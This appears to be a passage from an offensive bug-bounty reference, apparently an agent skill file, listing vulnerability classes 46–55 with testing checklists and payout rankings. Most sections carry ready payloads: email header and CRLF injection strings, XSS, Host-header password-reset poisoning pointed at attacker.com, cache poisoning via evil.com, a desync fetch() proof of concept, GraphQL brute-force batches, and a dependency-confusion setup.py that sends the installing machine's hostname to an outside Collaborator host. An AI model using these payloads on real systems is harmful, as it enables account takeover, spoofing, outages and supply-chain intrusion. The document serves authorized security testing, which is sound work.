name=Attacker&email=attacker@evil.com%0aCc:%20victim@victim.com&message=test
name=Attacker&email=attacker@evil.com%0aBcc:%20victim@victim.com&message=test

# CRLF variant
email=attacker%40evil.com%0d%0aBcc:%20spam@victim.com

# Multiple injection
email=a@b.com%0aTo:%20attacker1@evil.com%0aTo:%20attacker2@evil.com
```

### Subject Header Injection
```bash
# Subject line injection
subject=Hello%0aContent-Type:%20text/html%0a%0a<script>alert(1)</script>
# Adds HTML body with XSS payload to the email
```

### Body Injection
```bash
# Some implementations allow MIME boundary injection
message=normal%0a%0a--MIME_BOUNDARY%0aContent-Type:%20text/html%0a%0a<script>alert(1)</script>
```

### Testing Checklist
```
[ ] Find all contact forms, registration forms, support forms
[ ] Inject \n and \r\n into email, name, subject fields
[ ] Test: email=a@b.com%0aBcc:evil@attacker.com
[ ] Check if email is actually sent with injected header
[ ] Try URL-encoded variants: %0a, %0d%0a, %0A, %0D%0A
[ ] Check if HTML injection is possible via Content-Type header injection
[ ] Test reply-to injection for phishing: Reply-To: attacker@evil.com
```

### Impact Chain
- Email header injection + BCC = **Medium** (spam relay)
- Email header injection + HTML email = **Medium** (phishing)
- Email header injection + Reply-To manipulation = **Medium** (social engineering)

---

## 47. SUBDOMAIN DELEGATION TAKEOVER
> Dangling NS records or delegation chains allowing full DNS control of a subdomain.

### NS Delegation Takeover (Not Just CNAME)
```bash
# More powerful than CNAME takeover — NS control = full DNS authority
# Check for dangling NS delegation:
dig NS legacy.target.com
# Response: ns1.expired-provider.com ns2.expired-provider.com
# If expired-provider.com is available to register:
# Register it → set up ns1/ns2 → control ALL DNS for legacy.target.com!
# Can create: A records, MX records, TXT records (SPF, DMARC, DKIM)
```

### SPF Include Takeover
```bash
# Check SPF record for includes pointing to expired domains
dig TXT target.com | grep spf
# Example: v=spf1 include:expired-provider.com ~all
# If expired-provider.com available: register it, control SPF → send email as target!

# Look for _spf.target.com, spf.target.com etc.
dig TXT _spf.target.com
```

### DMARC Aggregate Report Redirect
```bash
# DMARC rua/ruf can point to external domains for aggregate reports
dig TXT _dmarc.target.com
# rua=mailto:reports@third-party-analytics.com
# If third-party-analytics.com is expired: register it, receive DMARC reports
# Reports contain sending infrastructure info, email volumes, auth failures
```

### Detection Workflow
```bash
# Enumerate all DNS records (subdomains, MX, SPF, DMARC, NS delegation)
subfinder -d target.com | while read sub; do
    dig NS "$sub" 2>/dev/null | grep -v "^;" | grep "NS" | grep -v "target.com"
done

# Check SPF includes
python3 -c "
import dns.resolver
r = dns.resolver.query('target.com', 'TXT')
for txt in r:
    if 'spf1' in str(txt):
        # extract include: domains
        print(str(txt))
"

# Check for NXDOMAIN on NS records
dig NS legacy.target.com @8.8.8.8
# NXDOMAIN on nameserver domain = potentially takeable
```

### Testing Checklist
```
[ ] Run amass/subfinder and check ALL subdomains, not just CNAME
[ ] dig NS for each subdomain — check if NS domain is expired
[ ] Check SPF includes for each domain (dig TXT + parse include: values)
[ ] Check DMARC rua/ruf mailto domains
[ ] Check MX records for expired mail servers
[ ] Verify NXDOMAIN on nameserver domains
[ ] Test registration availability of expired provider domains
```

### Impact Chain
- NS delegation takeover = **Critical** (full subdomain control)
- SPF include takeover = **High** (email spoofing as target domain)
- DMARC rua takeover = **Medium** (intelligence gathering)
- NS takeover + HTTPS cert = **Critical** (trusted TLS cert for subdomain)

---

## 48. OAUTH TOKEN THEFT VIA REFERER
> Implicit flow tokens in URL fragments leak to third parties via the Referer header.

### Root Cause
```
OAuth implicit flow (deprecated in OAuth 2.1 / RFC 9700 — replaced by Authorization Code + PKCE):
Still widely encountered in legacy apps. The recommended migration is to response_type=code
with PKCE (Proof Key for Code Exchange), which keeps tokens off the URL entirely.

Callback URL: https://app.com/callback#access_token=SECRET123&token_type=bearer

1. Token is in URL fragment (#)
2. Page at /callback loads — triggers requests to third-party resources
3. Browser sends Referer: https://app.com/callback#access_token=SECRET123
4. Third-party analytics / CDN / error tracker receives full token in Referer!

Note: Modern browsers strip fragments from Referer — but NOT all do, and
fragment can reach JS analytics that read window.location.href
```

### Attack Scenarios
```javascript
// Scenario 1: Referer leakage to embedded resources
// App loads Google Analytics, Mixpanel, etc. on the callback page
// Browser Referer includes fragment → analytics provider logs access token

// Scenario 2: window.location.href in analytics scripts
// Even if Referer strips fragment, JS analytics might read:
ga('send', 'pageview', {'page': window.location.href});
// Sends full URL including fragment to analytics!

// Scenario 3: Postback to analytics
// Many analytics scripts send document.referrer or location.href
// back to their servers — token in transit
```

### Testing Approach
```bash
# 1. Identify OAuth flows using implicit flow (response_type=token)
GET /oauth/authorize?response_type=token&client_id=APP&redirect_uri=...

# 2. Complete flow, observe callback URL for access_token in fragment
https://app.com/callback#access_token=TOKEN&token_type=bearer

# 3. Check what third-party resources load on callback page (DevTools → Network)
# 4. Check if Referer header contains token in those requests

# 5. Check JS analytics for window.location.href reads
grep -r "location.href\|location.hash" --include="*.js"

# Mitigation check: response_type=code (auth code flow) vs response_type=token
```

### Testing Checklist
```
[ ] Identify apps using OAuth implicit flow (response_type=token in URL)
[ ] Complete auth flow — capture callback URL with token in fragment
[ ] Open DevTools Network tab — check Referer header on third-party requests
[ ] Look for analytics, CDN, font, tracking pixel requests on callback page
[ ] Check if any analytics JS reads window.location.href
[ ] Check window.opener postMessage for fragment leakage
[ ] Test with strict Referrer-Policy — is it set? Does it help?
```

### Impact Chain
- Token in Referer + analytics = **High** (OAuth token theft → ATO)
- Token in Referer + analytics provider breach = **Critical**
- Implicit flow + token in URL = **Medium** (browser history, server logs)

---

## 49. TIMING SIDE CHANNELS
> Response time differences reveal secret information: username existence, password length, HMAC correctness.

### Root Cause
```python
# VULNERABLE — early return leaks username existence
def login(username, password):
    user = db.find_user(username)
    if not user:
        return "Invalid credentials"  # Fast response → user doesn't exist!
    if not check_password(password, user.hash):  # Slow → user exists, hash check runs
        return "Invalid credentials"

# VULNERABLE — string comparison timing (HMAC bypass)
if user_token == correct_token:  # Short-circuit on first differing byte!
```

### Username Enumeration via Timing
```python
# Statistical approach: measure 100 requests per username
import requests, time, statistics

def measure_timing(username):
    times = []
    for _ in range(20):
        start = time.perf_counter()
        requests.post('/login', json={'username': username, 'password': 'wrong'})
        times.append(time.perf_counter() - start)
    return statistics.median(times)

real_time = measure_timing('admin')        # ~350ms (hash computed)
fake_time = measure_timing('notreal999')   # ~50ms (user not found, early return)
# 300ms delta = username exists!
```

### HMAC Timing Attack
```python
# VULNERABLE — non-constant-time comparison
if token == expected_token:  # Python string comparison: O(first_different_byte)

# Attack: brute character by character
# Correct first char → slightly longer response time than wrong first char
# 256 requests per character position × token_length = full token recovery

# Tools: tlsfuzzer timing_test.py, timing-attack npm package
```

### Password Length Leakage
```bash
# bcrypt has work factor based on password length in some implementations
# Longer passwords → longer bcrypt computation → timing oracle for password length
# Statistical test: send 50 requests per length guess, compare median times
```

### Statistical Analysis
```bash
# Proper timing attack methodology:
# 1. Send N requests (N >= 100 for reliable signal)
# 2. Use median (not mean) to reduce network jitter
# 3. Use t-test or Mann-Whitney U test for statistical significance
# 4. Normalize: subtract same-server baseline
# 5. Tools: HackTools timing module, custom Python scripts
# 6. Threshold: >10ms difference usually exploitable with enough samples
```

### Testing Checklist
```
[ ] Test login endpoint: valid username vs invalid, measure time delta
[ ] Send 100+ requests to each to eliminate noise
[ ] Calculate median response time for each case
[ ] Test password reset: existing email vs non-existing
[ ] Test HMAC/signature verification for timing differences
[ ] Test account lockout: does timing change near lockout threshold?
[ ] Use Burp Repeater with response time column for quick comparison
```

### Impact Chain
- Timing + username = **Low–Medium** (enumeration only)
- Timing + HMAC oracle = **Critical** (token forgery)
- Timing + account existence + other vuln = **Medium** (combined attack)

---

## 50. INTEGER OVERFLOW / TRUNCATION
> Arithmetic overflow in price calculations, quantities, or balances enables financial fraud.

### Root Cause
```javascript
// VULNERABLE — no overflow check
function processOrder(quantity, unitPrice) {
    const total = quantity * unitPrice;  // Int32: overflows at ~2.1B
    // If total overflows → negative or small number → charged almost nothing!
}

// Or 16-bit: quantity=32768, price=2 → 65536 → overflows to 0
```

### Price Manipulation via Overflow
```bash
# If price is stored as integer cents (32-bit signed):
# Max int32 = 2,147,483,647 cents = $21,474,836.47
# quantity=2147483648 × price=1 = -2147483648 → negative total!

# Test with extreme quantities:
{"item_id": "premium", "quantity": 2147483648}
{"item_id": "premium", "quantity": 4294967296}
{"item_id": "premium", "quantity": 9223372036854775808}  # int64 overflow
{"item_id": "premium", "quantity": -1}  # negative quantity

# Float precision abuse
{"price": 0.1, "quantity": 3}  # = 0.30000000000000004 in IEEE 754
# May cause rounding discrepancies in financial systems
```

### Account Balance Overflow
```bash
# Credit account to near MAX_INT, add 1 more credit
# Balance overflows to negative or wraps to 0

# Test transfer + balance check:
POST /api/transfer {"amount": 2147483647}  # max int32
# Then: POST /api/transfer {"amount": 1}   # should overflow
```

### Type Truncation
```bash
# JavaScript: parseInt truncates
# Input: "1000000000000000" → parsed as 1000000000000000 (fine in JS)
# Backend C/Java: long → int conversion: truncated!

# PHP: "9999999999" → PHP_INT_MAX = 2147483647 on 32-bit
# Use very large numbers that trigger truncation at different layers
```

### Testing Checklist
```
[ ] Find all numeric inputs: quantity, price, amount, balance, count
[ ] Try: 0, -1, -999999, 2147483647, 2147483648, 4294967295, MAX_INT64
[ ] Try float: 0.001, 0.0001, 1e308
[ ] Try string representation of large numbers: "99999999999999999999"
[ ] Test with both positive overflow and negative values
[ ] Check if total/balance shows unexpected result (negative, zero, wrap)
[ ] Check e-commerce checkout flows especially
[ ] Test GraphQL Int fields (32-bit by spec — overflow easily)
```

### Impact Chain
- Integer overflow + checkout = **Critical** (purchase items for free or negative price)
- Integer overflow + balance = **Critical** (unlimited credits)
- Integer truncation + transfer = **High** (incorrect transfer amount)

---

## 51. REDOS — REGEX DENIAL OF SERVICE
> Malicious input causes catastrophic backtracking in regular expressions — server CPU maxes out.

### Root Cause
```javascript
// VULNERABLE — ambiguous quantifiers allow exponential backtracking
const EMAIL_REGEX = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

// If user sends: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!" (no @ symbol)
// Regex backtracks exponentially — single request saturates CPU!
```

### Vulnerable Pattern Examples
```javascript
// Pattern 1: nested quantifiers
/(a+)+$/   // input: "aaaaaaaaaaaaaaaaaaaaaa!"
/(a|a)+$/  // same issue
/([a-z]+)*$/

// Pattern 2: alternation with overlap
/(a|aa)+$/
/(a|b|c|d|ab|bc|cd)+$/

// Pattern 3: real-world email regex
// Standard email regexes are often vulnerable
// Test: "aaaaaaaaaaaaaaaaaaaaaa@"  or  prefix + "!"

// Pattern 4: URL/phone number validators with complex patterns
/^(\d{3}[-.]?)?\(?\d{3}\)?[-.]?\d{4}$/  // some variants vulnerable
```

### Testing Approach
```bash
# Tool: vuln-regex-detector
# Tool: regexploit (generates evil input for vulnerable regex)
# Tool: safe-regex npm package (static analysis)

# Manual test: send exponentially growing input
python3 -c "print('a' * 100 + '!')"  # Start small
python3 -c "print('a' * 1000 + '!')"  # If first takes >1s, don't go higher

# Measure response time:
time curl -s -X POST https://target.com/api/validate \
  -H "Content-Type: application/json" \
  -d '{"email": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@"}'
# >5 seconds = ReDoS confirmed
```

### Finding Vulnerable Patterns
```bash
# Grep source for potentially vulnerable regex
grep -rn "new RegExp\|regex\|pattern\|PATTERN" --include="*.js" --include="*.ts" \
    | grep -E "\+\+|\*\*|\|.*\||\+\*|\*\+"

# Static analysis
npm install -g safe-regex
safe-regex '(a+)+'  # returns: unsafe
```

### Testing Checklist
```
[ ] Find all input validation endpoints (email, phone, URL, zip code)
[ ] Identify client-side and server-side regex validators
[ ] Test with progressively longer inputs that would fail validation
[ ] Measure response time — >2 second anomaly = potential ReDoS
[ ] Use regexploit to generate specific evil strings for known patterns
[ ] Check npm/pip deps for outdated validators (known ReDoS CVEs)
[ ] Test GraphQL input validation fields
```

### Impact Chain
- ReDoS on public endpoint = **High** (DoS, service disruption)
- ReDoS on auth endpoint = **High** (blocks all logins)
- ReDoS with amplification (100 requests) = **Critical** (full outage)

---

## 52. HOST HEADER POISONING EXPANDED
> Manipulating the Host header to poison caches, redirect password resets, or access internal vhosts.

### Root Cause
```python
# VULNERABLE — uses Host header for password reset links
def send_reset(email):
    host = request.headers.get('Host')  # attacker-controlled!
    token = generate_token(email)
    link = f"https://{host}/reset?token={token}"
    send_email(email, link)
    # Victim clicks: https://attacker.com/reset?token=VICTIM_TOKEN
    # Attacker's server logs the token!
```

### Password Reset Poisoning
```bash
# Step 1: Trigger password reset for victim email
POST /password-reset
Host: attacker.com
Content-Type: application/json
{"email": "victim@target.com"}

# If app uses Host header to build reset link:
# Victim gets email: Click here → https://attacker.com/reset?token=TOKEN123
# Victim clicks link → attacker.com receives token → ATO!

# Variants
Host: target.com:@attacker.com  # URL credentials trick
X-Forwarded-Host: attacker.com  # Often trusted by backend
X-Host: attacker.com
X-Original-URL: attacker.com
```

### Web Cache Poisoning via Host
```bash
# Inject into Host header, if response is cached with poisoned host:
GET / HTTP/1.1
Host: target.com"><script>alert(1)</script>
# If X-Forwarded-Host or Host appears in response without encoding:
# Cache stores response with XSS → served to all visitors!

# Practical cache poisoning via X-Forwarded-Host:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
# If response includes: <link href="https://evil.com/style.css">
# And response is cached → all users get poisoned response!
```

### Routing-Based SSRF via Host
```bash
# Internal routing by Host header → access internal vhosts
GET /admin HTTP/1.1
Host: internal-admin.local

# Absolute URL + Host mismatch:
GET https://public.target.com/admin HTTP/1.1
Host: internal-only.target.com
# Some proxies route by Host, others by absolute URL → confusion
```

### X-Forwarded-Host Variants
```bash
# All headers that may override Host for link generation:
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
```

### Testing Checklist
```
[ ] Send password reset with Host: attacker.com header
[ ] Try X-Forwarded-Host, X-Host, X-Forwarded-Server variants
[ ] Check if reset email link contains attacker.com domain
[ ] Test Host header injection in all features that generate links (email, export)
[ ] Check if Host appears in response body (XSS + cache poisoning potential)
[ ] Test absolute URL in GET line with different Host header
[ ] Test internal hostname guessing via Host routing
[ ] Check Vary header for Host (should be present to prevent cache poisoning)
```

### Impact Chain
- Host header + password reset = **Critical** (ATO)
- Host header + cache poisoning = **High** (stored XSS for all users)
- Host header + routing SSRF = **High** (internal access)
- Host header in link building = **High** (open redirect, phishing)

---

## 53. GRAPHQL DEEP
> Advanced GraphQL attack surface beyond basic introspection.

### Directive Overloading
```graphql
# Some implementations process directives multiple times
# Duplicate directives can cause unexpected behavior
query {
  user(id: "1") @skip(if: false) @skip(if: false) @skip(if: false) {
    username
  }
}

# @deprecated directive injection
mutation {
  updateUser(
    name: "test" @deprecated(reason: "' OR 1=1--")  # SQLi in directive arg
  ) { id }
}
```

### Circular Fragment DoS
```graphql
# Fragments can reference each other — infinite loop = DoS
fragment A on User { ...B }
fragment B on User { ...A }

query {
  user(id: "1") { ...A }
}

# Query depth DoS (even without circular fragments)
query {
  user { friends { friends { friends { friends { friends { id } } } } } }
}
# Exponential backend queries!
```

### Persisted Query Abuse
```graphql
# Some apps use persisted queries (hash → query mapping)
# Test if arbitrary queries can be registered as persisted queries
POST /graphql
{
  "extensions": {
    "persistedQuery": {
      "version": 1,
      "sha256Hash": "custom_hash"
    }
  },
  "query": "{ __schema { types { name } } }"  # Register new query
}

# Test if disabled operations can be bypassed via persisted query
# Test if persisted queries bypass query depth/complexity limits
```

### Field Suggestion Information Leak
```graphql
# GraphQL suggests correct field names on typos — even if introspection disabled!
query { usr { id } }
# Response: "Did you mean 'user'?"  ← exposes schema
query { user { passwrd } }
# Response: "Did you mean 'password'?"  ← exposes field names

# Even with introspection disabled, field suggestion reveals schema
# Automate with Clairvoyance tool
```

### Batch Query Attack
```graphql
# Array of operations in one request bypasses rate limits
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass3\") { token } }"}
]
```

### Testing Checklist
```
[ ] Test introspection: {__schema{types{name}}}
[ ] If disabled: use Clairvoyance for field suggestion enumeration
[ ] Test query depth with deeply nested queries (10+ levels)
[ ] Test circular fragment reference
[ ] Test alias flooding in mutations (rate limit bypass)
[ ] Test directive overloading / duplicate directives
[ ] Test persisted query registration
[ ] Test batch query array syntax
[ ] Try IDOR via relay global IDs: node(id: "base64(User:2)")
[ ] Test subscription endpoint separately (often less secured)
```

### Impact Chain
- GraphQL introspection = **Info** (schema leak, useful for further attacks)
- GraphQL depth + alias DoS = **High** (denial of service)
- GraphQL IDOR = same as HTTP IDOR (**Medium–High**)
- GraphQL field suggestion = **Low–Medium** (schema reconnaissance)

---

## 54. DEPENDENCY CONFUSION
> Internal package names registered on public registries — CI/CD and developers pull the malicious public version.

### Root Cause
```
Company uses private npm package: @company/internal-utils (v1.0.0 on internal registry)
Attacker registers @company/internal-utils (v99.0.0) on public npmjs.com
npm install picks highest version → installs attacker's malicious package!
Package managers check public registry first by default.
```

### Detection Approach
```bash
# Step 1: Find internal package names
# Leaked in: package.json on GitHub, error messages, job listings, Docker images
# GitHub search:
gh api 'search/code?q=org:TARGET+filename:package.json+"@company/"' --jq '.items[].html_url'

# Step 2: Check if internal names exist on public registry
npm show @company/internal-utils  # ENOPKG = not published = potential attack surface!
pip show company-internal-lib     # Not found = potential attack surface!

# Step 3: Verify
curl https://registry.npmjs.org/@company/internal-utils
# 404 = name available to register!
```

### Ecosystems to Check

| Ecosystem | Registry | Detection Command |
|---|---|---|
| Node.js | npmjs.com | `npm view PACKAGE` |
| Python | pypi.org | `pip install PACKAGE --dry-run` |
| Ruby | rubygems.org | `gem list --remote PACKAGE` |
| Java | maven.central | `mvn dependency:get -Dartifact=GROUP:ARTIFACT:VERSION` |
| .NET | nuget.org | `nuget install PACKAGE` |
| Go | pkg.go.dev | module name check |

### PoC for Bug Bounty (Safe Version)
```python
# For safe PoC: register with version 9999.0.0, package installs and POSTs to Burp Collaborator
# setup.py (Python):
import setuptools, requests

requests.get('https://UNIQUE.burpcollaborator.net/installed?pkg=' + __name__ +
             '&host=' + __import__('socket').gethostname())

setuptools.setup(name='company-internal-lib', version='9999.0.0')
```

### Testing Checklist
```
[ ] Search GitHub for target org's package.json files
[ ] Enumerate package names from job postings, error pages, docs
[ ] Check each name on public registry (npm, PyPI, RubyGems)
[ ] Look for internal names in: Dockerfile, .github/workflows, CI configs
[ ] Check Maven groupIds associated with the company
[ ] Search npm for @company/ scope packages that DO exist (sibling packages reveal naming convention)
[ ] Report to program before registering (some programs allow benign registration with Collaborator ping)
```

### Impact Chain
- Dependency confusion = **Critical** (RCE on dev machines, CI/CD, production)
- Typically pays $10,000+ on H1 programs
- Microsoft, Apple, Shopify paid $30,000–$40,000 for this class

---

## 55. CLIENT-SIDE DESYNC
> Browser-powered request smuggling — no server-to-server needed. Victim's browser smuggles requests.

### Root Cause
```
Traditional smuggling: attacker sends malformed request to poison server queue.
Client-side desync: victim's browser is the attack vector.

1. Server accepts CL.0 requests (ignores Content-Length on GET-like paths)
2. Attacker serves malicious page with fetch/XHR that sends "smuggled" request
3. Victim visits attacker page → victim's browser poisons the server's response queue
4. Victim's next legitimate request gets the poisoned response
```

### CL.0 Desync
```
# Test if server ignores Content-Length on certain endpoints:
POST /api/health HTTP/1.1
Host: target.com
Content-Length: 34
Connection: keep-alive

GET /admin HTTP/1.1
X-Ignore: x
# If server ignores CL on /api/health → treats GET /admin as next request!
```

### Client-Side Desync PoC
```javascript
// Victim visits attacker.com which runs:
fetch('https://target.com/api/health', {
    method: 'POST',
    body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\nX-Ignore: ',
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    // Second request — gets poisoned response intended for admin request
    fetch('https://target.com/', {
        mode: 'no-cors',
        credentials: 'include'
    });
});
```

### Pause-Based Desync
```bash
# Use Burp's pause-and-resume feature to test desync
# 1. Send partial request body
# 2. Pause mid-transfer
# 3. Server processes partial — smuggled portion lands in next request
# Burp Suite → Repeater → right-click → "Send with request timing"
```

### Testing Checklist
```
[ ] Look for HTTP/1.1 keep-alive connections
[ ] Test CL.0: send POST with body to HEAD/OPTIONS/health endpoints
[ ] Check if Content-Length is ignored on certain paths
[ ] Use HTTP Request Smuggler Burp extension for automated detection
[ ] Build client-side PoC with fetch() — test in Chrome with CORS mode
[ ] Test Connection: keep-alive + pipelining behavior
[ ] Check if pause-based desync shows smuggled content in next response
[ ] Test on CDN edge (Cloudflare, Akamai, CloudFront) — often susceptible
```

### Impact Chain
- Client-side desync + XSS delivery = **High** (XSS without any XSS in app)
- Client-side desync + admin response poisoning = **Critical**
- Client-side desync + cookie theft = **Critical** (ATO)
- Client-side desync + CSRF bypass = **High**

---

## QUICK REFERENCE — ALL 35 CLASSES

| # | Class | Key Signal | Tool |
|---|---|---|---|
| 21 | JWT Attacks | alg=none accepted, RS256→HS256 | jwt_tool.py |
| 22 | Prototype Pollution | status:555 response | ppmap, PPScan |
| 23 | Deserialization | rO0AB, a:, pickle bytes | ysoserial, phpggc |
| 24 | XXE | File read, OOB DNS | Burp, Collaborator |
| 25 | WebSocket Vulns | CSWSH, IDOR in WS | Burp WS tab |
| 26 | HTTP Parameter Pollution | Duplicate params | Manual |
| 27 | Mass Assignment | Role/admin field injection | Manual |
| 28 | Path Traversal | ../../../etc/passwd variants | dotdotpwn |
| 29 | HTTP/2 Desync | H2.CL, H2.TE | Burp H2, Smuggler |
| 30 | DNS Rebinding | SSRF filter bypass | Singularity |
| 31 | CORS Deep | Null origin, regex bypass | Manual + curl |
| 32 | Insecure Randomness | Sequential tokens, mt_rand | Burp Sequencer |
| 33 | LDAP Injection | Auth bypass with *)( | ldapmap |
| 34 | NoSQL Injection | $gt/$ne/$where operators | Manual |
| 35 | Rate Limit Bypass | XFF headers, alias flood | Burp Intruder |
| 36 | Clickjacking Advanced | iframe loads, ALLOW-FROM Chrome | Manual PoC |
| 37 | CRLF Injection | %0d%0a in headers | Manual |
| 38 | Web Cache Deception | .css suffix on profile | Manual |
| 39 | Server-Side PP | Status 555 gadget | PPScan |
| 40 | PostMessage Vulns | No origin check + sinks | Manual JS grep |
| 41 | CSS Injection | Attribute selector exfil | Manual |
| 42 | Dangling Markup | img src tag in HTML | Manual |
| 43 | Parser Differentials | Unicode normalization | Manual |
| 44 | ESI Injection | <esi:include> OOB DNS | Collaborator |
| 45 | PDF SSRF/XSS | file:// in iframe | Collaborator |
| 46 | Email Header Injection | %0aBcc: injection | Manual |
| 47 | Subdomain NS Takeover | Dangling NS records | dig, amass |
| 48 | OAuth Referer Leak | Token in fragment + analytics | DevTools |
| 49 | Timing Side Channels | Username timing delta | Python script |
| 50 | Integer Overflow | MAX_INT quantities | Manual |
| 51 | ReDoS | Catastrophic backtracking | regexploit |
| 52 | Host Header Poisoning | Password reset link | Manual |
| 53 | GraphQL Deep | Circular fragments, suggestions | Clairvoyance |
| 54 | Dependency Confusion | Internal pkg on public registry | npm view |
| 55 | Client-Side Desync | CL.0 + browser fetch PoC | Burp Smuggler |

---

## HUNTING PRIORITY MATRIX

### Highest Payout (Often $5,000–$50,000+)
1. **#54 Dependency Confusion** — RCE on CI/CD, consistently critical
2. **#21 JWT alg=none/jku** — direct account takeover
3. **#22 Server Prototype Pollution + RCE** — Node.js RCE
4. **#23 Deserialization + RCE** — Java/PHP/Python RCE
5. **#52 Host Header + Password Reset** — reliable ATO path

### Medium-High Payout ($500–$5,000)
6. **#29 HTTP/2 Desync** — complex but high-impact
7. **#44 ESI Injection** — SSRF/XSS via caching layer
8. **#45 PDF SSRF** — easy to find, good payout
9. **#38 Web Cache Deception** — PII/CSRF token exposure
10. **#47 NS Delegation Takeover** — more powerful than CNAME

### Often Overlooked / Less Competition
- **#41 CSS Injection** — works under strict CSP where JS fails
- **#42 Dangling Markup** — bypasses sanitizers
- **#48 OAuth Referer** — implicit flow still common in old apps
- **#50 Integer Overflow** — e-commerce goldmine
- **#35 Rate Limit Bypass** — enables all brute-force attacks

---

*Load with: `/exotic-vulns` — Cross-reference with `/bug-bounty` master skill for full chains.*
